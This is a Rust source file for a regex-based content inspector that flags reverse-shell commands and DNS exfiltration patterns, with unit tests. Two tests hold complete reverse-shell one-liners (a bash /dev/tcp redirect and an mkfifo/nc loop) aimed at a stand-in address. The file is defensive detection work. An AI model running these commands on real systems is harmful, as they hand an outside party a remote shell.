use regex::Regex;

pub struct ContentInspector {
    rules: Vec<(&'static str, Regex)>,
}

impl ContentInspector {
    pub fn new() -> Self {
        let raw = vec![
            ("R001", r"bash\s+-i\s+>&\s*/dev/tcp/"),
            ("R002", r"mkfifo\s+.*\bnc\b"),
            ("R003", r"(dig|nslookup|host)\s+.*\$"),
        ];
        let rules = raw
            .into_iter()
            .map(|(id, pat)| (id, Regex::new(pat).unwrap()))
            .collect();
        Self { rules }
    }

    pub fn inspect_input(&self, text: &str) -> Vec<&'static str> {
        self.rules
            .iter()
            .filter(|(_, re)| re.is_match(text))
            .map(|(id, _)| *id)
            .collect()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn case_tcp_01() {
        let inspector = ContentInspector::new();
        let findings = inspector.inspect_input("bash -i >& /dev/tcp/198.51.100.9/4444 0>&1");
        assert!(!findings.is_empty());
    }

    #[test]
    fn case_outbound_fifo_02() {
        let inspector = ContentInspector::new();
        let findings = inspector
            .inspect_input("mkfifo /tmp/p; nc 198.51.100.9 9001 < /tmp/p | /bin/sh > /tmp/p 2>&1");
        assert!(!findings.is_empty());
    }

    #[test]
    fn case_benign_script_03() {
        let inspector = ContentInspector::new();
        let findings = inspector.inspect_input("#!/bin/bash\necho hello world\n");
        assert!(findings.is_empty());
    }
}
